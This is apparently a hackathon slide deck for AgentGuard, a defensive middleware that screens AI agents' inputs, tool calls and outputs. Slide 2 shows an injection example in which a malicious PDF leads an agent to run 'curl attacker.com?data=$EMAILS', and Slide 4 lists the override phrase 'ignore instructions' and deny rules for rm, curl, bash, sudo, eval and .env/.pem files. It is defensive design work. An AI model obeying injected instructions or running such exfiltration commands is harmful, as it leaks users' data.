# AgentGuard — Presentation Deck

**AI Unlocked 2026 | Track 5: Trustworthy AI | IIT Kharagpur | Team NamoFans**

| Animesh Raj | Atul Singh | Devansh Gupta | Prem Agarwal | Mohd Faizan Khan |
|---|---|---|---|---|
| Research & Docs | AI/ML Architecture | Backend & Cloud | Security & Safety | Backend & Cloud |

---

## Slide 1 — Product Vision: What Are You Building Towards?

### AgentGuard

> **Making every AI agent trustworthy by default — a security middleware that intercepts, evaluates, and governs every action an AI agent takes, before it executes.**

We are building the **Cloudflare WAF for AI agents** — a drop-in security layer that sits between AI agents and the real world. Just as web application firewalls made deploying web apps safe without rewriting them, AgentGuard makes deploying AI agents safe without rearchitecting them.

**The long-term vision:** Every enterprise AI agent ships with AgentGuard the way every website ships behind a WAF. One YAML config. One decorator. Full OWASP Agentic Top 10 coverage. Zero architecture changes.

---

## Slide 2 — Problem Statement: What Are You Solving?

### AI agents are deploying faster than security can follow

**Who faces this problem:** Enterprise security leads and ML platform engineers deploying LLM-based agents in finance, healthcare, and SaaS — where a single unchecked tool call can exfiltrate data, execute malicious code, or violate compliance.

**Why it matters now:**

```
  REAL ATTACKS                    GOVERNANCE GAP                 SCALING RISK
  ────────────────────            ────────────────────           ────────────────────
  CVE-2025-32711 (CVSS 9.3)      75% of IT leaders cite         40% of enterprise apps
  Zero-click data exfiltration    security as #1 AI deployment   will use AI agents by
  via M365 Copilot (EchoLeak)    blocker (Gartner 2025)         2028 (Gartner)

  CVE-2026-25253 (CVSS 8.8)      60% have NOT done an           OWASP Agentic Top 10:
  One-click RCE on personal       AI risk assessment in the      10 distinct attack
  AI agents (OpenClaw)            last 12 months                 classes (2025)
```

**The specific gap:** Existing tools (content filters, API gateways, RBAC) operate on individual inputs or outputs. None of them intercept a tool call **before execution** with awareness of who called it, what arguments it carries, whether those arguments came from a malicious document, and whether the agent's behavior over time is drifting toward exploitation.

**Concrete impact:** Adversarial PDF read by agent -> `curl attacker.com?data=$EMAILS` -> breach. No existing guardrail catches this because it spans input, tool call, and behavioral context.

---

## Slide 3 — Your Solution: What Have You Built?

### AgentGuard = A WAF for Agentic Workflows

AgentGuard is an **in-process security middleware** that intercepts every input, tool call, and output flowing through an AI agent. It implements a **4-layer defense-in-depth** architecture:

```
  Developer writes ONE decorator:           Full 4-layer security stack fires:
  ──────────────────────────────   --->     ──────────────────────────────────
  @guard_agent(config="ag.yaml")            L1  Input shielding (injection, jailbreak)
  def run(user_message: str):               L2  Output PII + toxicity filter
      return call_llm(user_message)         L3  Tool call firewall (5 guardrails + MELON)
                                            L4  Adaptive PBAC + behavioral anomaly engine
```

**Key idea:** Unlike Guardrails AI (validates what the model *says*), AgentGuard validates what the agent *does* — intercepting the tool call itself, its arguments, and the behavioral trajectory of the session.

**Results at a Glance:**

```
  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
  |  95 - 97.5%  |   |     96%      |   |    0.65 s    |   |     218      |
  |  attack block|   |  CRITICAL    |   |  avg block   |   |  unit + e2e  |
  |    rate      |   |  block rate  |   |  (offline)   |   |  0 failures  |
  └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
   vs 7.5% unguarded   adversarial suite   no API needed     full coverage
```

---

## Slide 4 — Product Walkthrough: How It Works

### User Flow: Input -> 4 Layers -> Safe Output

```
  User Input
      |
      v
  [L1 INPUT SHIELD]
      Tier 0: Exact blocklist match           < 0.1 ms   FREE
      Tier 1: 33-pattern regex pre-filter      < 1 ms    FREE
      Tier 2: Azure AI Prompt Shields          ~50 ms    Azure
      --> Catches: "ignore instructions", jailbreaks, code injection
      |
      v  (only clean inputs reach the agent)
  Agent Logic Runs -> LLM generates tool calls
      |
      v  (every tool call intercepted BEFORE execution)
  [L4 ADAPTIVE ENGINE]   <-- NEW: replaces static ABAC
      L4a: PBAC Policy Engine (YAML policies, hot-reloadable, <2ms)
           -> ALLOW | DENY | ELEVATE
      L4b: 3 behavioral sub-scorers (async, isolated):
           1. HalfSpaceTrees anomaly (per-role, online learning)
           2. Session graph + IOA pattern matching (NetworkX)
           3. Compliance drift monitor (sensitivity trajectory)
           -> Fused risk_score: DENY >= 0.90, ELEVATE >= 0.70
      |
      v
  [L3 TOOL FIREWALL]
      file_system  | path allowlist, deny .env/.pem
      sql_query    | SELECT only, deny DROP/DELETE/UPDATE
      shell_cmds   | deny rm, curl, bash, sudo, eval
      http_post    | domain allowlist, HTTPS required
      + C2 MELON hybrid (embedding pre-filter + LLM judge)
      + C4 HITL / AITL approval workflow
      |
      v  (agent response)
  [L2 OUTPUT GUARDRAIL]
      Azure AI Language -> PII redaction (SSN, keys, email)
      Azure Content Safety -> Toxicity filter
      |
      v
  Safe Response -> User
```

### Developer Experience

```
  Step 1               Step 2              Step 3             Step 4
  agentguard init  ->  Fill .env       ->  @guard_agent   ->  agentguard test
  Generates YAML       (Azure keys)        One decorator      25+ adversarial
  + .env.example                           wraps any agent    scenarios (Promptfoo)
```

**Live Dashboard:** [agentguard.exempl4r.xyz](https://agentguard.exempl4r.xyz/) -- Real-time OTel traces, per-layer block counts, audit log, guarded vs. unguarded demo playground.

---

## Slide 5 — Key Features: What Makes It Strong

### 1. Adaptive Behavioral Anomaly Detection (L4b)

Unlike static rule-based systems, L4b uses **online machine learning** (River HalfSpaceTrees) that learns per-role behavioral baselines from the first tool call. It detects:
- **Sensitivity escalation** (CPF S7): progressive access to increasingly sensitive resources over a session
- **IOA subsequence matching**: known attack sequences (credential harvesting, recon+exfil, privilege escalation) detected via session graph analysis — resilient to interleaved junk calls
- **Cold-start resilience**: shared global model delegates to per-role models after 50 calls

### 2. Context-Isolated Monitor (CPF S11.2)

L4b receives **only hashed metadata** (TelemetrySpan) — never raw tool arguments or LLM messages. This prevents the behavioral monitor from being compromised by the same adversarial context that attacks the agent itself.

### 3. Hot-Reloadable YAML Policies (L4a)

Security policies are defined in `l4_policies.yaml`, not hardcoded. Supports wildcards, condition operators (eq/gte/lte/in/not_in), and hot-reload without restart. First-match-wins evaluation with configurable default-deny.

### 4. Tiered Cost Optimization (L1)

Offline regex pre-filter blocks 40-60% of attacks for free (<1ms). Azure API is called only for ambiguous inputs. This reduces Azure API costs by 40-60% while maintaining 95-97.5% block rate.

### 5. PyPI-Ready Package with Optional Extras

```bash
pip install agentguard                    # core only (10 deps)
pip install agentguard[dashboard]         # + FastAPI, uvicorn, SSE
pip install agentguard[testing]           # + deepteam, litellm
pip install agentguard[all]               # everything
```

---

## Slide 6 — Architecture & Tech Stack: How You Built It

### System Architecture

```
  ┌─────────────────────────────────────────────────────────────────────┐
  |                          AGENTGUARD                                 |
  |                                                                     |
  |  ┌────────────────┐    ┌──────────────────┐    ┌─────────────────┐ |
  |  |  Decorator      |    |   Guardian       |    |  Config Engine  | |
  |  |  Layer          |--->|   (orchestrator) |<---|  agentguard.yaml| |
  |  |  @guard_agent   |    |  routes to all   |    |  l4_policies.   | |
  |  |  @guard         |    |  layers in order |    |    yaml         | |
  |  └────────────────┘    └──────┬───────────┘    └─────────────────┘ |
  |                               |                                     |
  |              ┌────────────────┼─────────────┐                      |
  |              v                v             v                       |
  |  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐       |
  |  |  L1 Input      |  |  L4 Adaptive   |  |  L3 Tool       |       |
  |  |  Shield        |  |  Engine        |  |  Firewall      |       |
  |  |  fast_inject   |  | PolicyDecision |  |  5 guardrails  |       |
  |  |  prompt_shields|  |  Point (PBAC)  |  |  + C1/C2/C4   |       |
  |  |  blocklists    |  | L4Orchestrator |  └────────────────┘       |
  |  └────────────────┘  |  Baseline(HST) |                           |
  |                       |  SessionGraph  |  ┌────────────────┐       |
  |  ┌────────────────┐  |  DriftMonitor  |  | Observability  |       |
  |  |  L2 Output     |  └────────────────┘  | OTel -> Jaeger |       |
  |  |  PII + Toxicity|                      | SQLite audit   |       |
  |  └────────────────┘                      └────────────────┘       |
  └─────────────────────────────────────────────────────────────────────┘
```

### Technology Stack

```
  Layer / Concern            Technology
  ─────────────────────────  ──────────────────────────────────────────────
  Language & packaging       Python 3.11+ | uv | PyPI-ready (hatchling)
  L1 injection detection     Azure AI Content Safety (Prompt Shields)
                             + 33-pattern offline regex (free, <1ms)
  L2 output safety           Azure AI Language (PII) + Content Safety (toxicity)
  L3 tool firewall           Pure Python rule-based (sqlparse, ipaddress)
                             + C2 MELON hybrid (embedding + LLM judge)
  L4a policy engine          YAML-driven PBAC (hot-reloadable, first-match-wins)
  L4b behavioral scoring     River HalfSpaceTrees (online ML, per-role)
                             NetworkX session graph + IOA pattern matching
                             NumPy Pearson correlation (drift monitor)
  Observability              OpenTelemetry -> Jaeger + SQLite audit log
  Red-team testing           Promptfoo (npx) + DeepTeam (OWASP Top 10)
  LLM gateway                TrueFoundry (OpenAI-compatible)
  Live dashboard             FastAPI + agentguard.exempl4r.xyz
```

### Azure Services Used

| Service | Layer | Purpose |
|---|---|---|
| Azure AI Content Safety | L1 | Prompt Shields, content filters, custom blocklists |
| Azure AI Language | L2, C1 | PII detection, named entity recognition on tool args |
| Azure Container Apps | Deploy | Live dashboard hosting |

---

## Slide 7 — AI Integration & Enhancements

### Where and How AI Is Used

| AI Technique | Component | Why It's the Right Choice |
|---|---|---|
| **Online ML (HalfSpaceTrees)** | L4b Baseline | Learns from every tool call. No training data needed. Solves cold-start problem that broke the old Z-score approach. |
| **Graph anomaly + subsequence IOA** | L4b Session Graph | Models agent sessions as directed graphs. Detects multi-step attack chains via ordered subsequence matching — resilient to evasion by interleaved junk calls. |
| **Pearson correlation** | L4b Drift Monitor | Implements CPF S7 (autoregressive drift formalism). Detects slow-burn privilege escalation across a session — mathematically proven detectable via trajectory analysis. |
| **LLM-as-judge** | C2 MELON, C4 AITL | Semantic injection detection where rules fail. Open-source safety LLMs (Llama Guard 3, Granite Guardian) for data privacy. |
| **Embedding similarity** | C2 MELON pre-filter | Cosine similarity pre-filter resolves ~80% of cases without LLM call. Only ambiguous cases go to the judge. |

### Enhancements Since Phase 1

| Phase | What Changed | Why |
|---|---|---|
| Phase 1 | Static ABAC matrix + Z-score behavioral | Hardcoded, no temporal context, cold-start failure |
| Phase 3 | + MELON hybrid detection, sandbox, AITL | Tool-call-level injection detection, kernel isolation |
| **Phase 5** | **L4 Adaptive Engine: PBAC + 3 behavioral sub-scorers** | **Hot-reloadable policies, online learning, graph-based IOA detection, drift monitoring. Grounded in CPF S7/S11.2 and SentinelAgent (arXiv:2505.24201).** |

### Theoretical Grounding

The L4 upgrade is grounded in two research contributions:
- **CPF S7** (Canale 2026): Autoregressive drift — `P(comply_t | comply_{t-1}) >> P(comply_t | x)` — proves sensitivity escalation is detectable via trajectory, not just point-in-time checks
- **CPF S11.2** (Canale 2026): External monitor independence — defense must be architecturally independent of the defended model. TelemetrySpan enforces this isolation boundary.
- **SentinelAgent** (He et al. 2025, arXiv:2505.24201): Graph-based anomaly detection in multi-agent systems — node/edge/path scoring adapted for our session graph IOA matcher

---

## Slide 8 — Scalability, Challenges & What's Next

### Scalability

- **PyPI package with optional extras**: `pip install agentguard` pulls only 12 core deps. Dashboard, testing, autogen are opt-in.
- **Framework-agnostic**: Works with any Python agent framework (AutoGen, LangGraph, CrewAI) via decorator or programmatic API.
- **L4a latency <2ms** (sync, in-process). **L4b latency <80ms** (async, acceptable for tool-call interception).
- **Horizontal scaling**: Stateless Guardian instances behind a load balancer. Behavioral models persist to disk for warm restart.

### Go-to-Market

- **Open-source PyPI package** for developer adoption
- **Enterprise tier**: Managed L4b behavioral models, centralized policy management, compliance dashboards
- **Integration partners**: Azure AI Foundry marketplace, AutoGen ecosystem

### Current Challenges

```
  Challenge                              Mitigation
  ─────────────────────────────────────  ──────────────────────────────────────────
  L4b HalfSpaceTrees slow at height=15   Reduced to height=8 default; configurable
  Behavioral baselines need real traffic  Cold-start global model + warm restart via persist/load
  AutoGen adapter not yet written        Dependency installed; adapter is a thin wrapper
  Spotlighting requires Azure Foundry     Tier-1 regex covers common memory poisoning patterns
```

### Roadmap

```
  Q2 2026  Per-agent behavioral baselines via OTel -> ClickHouse time-series
  Q2 2026  SPIFFE/SVID cryptographic agent identity (pairs with MS Agent Governance Toolkit)
  Q3 2026  AutoGen / Magentic-One adapters for zero-code adoption
  Q3 2026  Guardrails AI as optional L2 plugin
  Q4 2026  Automated IOA pattern learning from historical attack data
```

---

## References

| # | Citation |
|---|---|
| 1 | He et al., "SentinelAgent: Graph-based Anomaly Detection in LLM-based MAS", arXiv:2505.24201, May 2025 |
| 2 | Canale, "Behind the Buzzwords: The Real Mechanics of LLM Security", CPF Technical Reference v1.0, Feb 2026 |
| 3 | Tan et al., "Half-Space Trees for streaming anomaly detection", ICDM 2011 |
| 4 | OWASP Top 10 for Agentic AI Applications, 2025 |
| 5 | Microsoft Agent Governance Toolkit — OWASP Agentic Top 10 compliance |
| 6 | CVE-2025-32711, EchoLeak (CVSS 9.3) — zero-click data exfiltration via M365 Copilot |
| 7 | CVE-2026-25253, OpenClaw RCE (CVSS 8.8) — personal AI agent attack surface |
| 8 | aembit.io, Jan 2026 — 7 signal types for non-human identity behavioral monitoring |
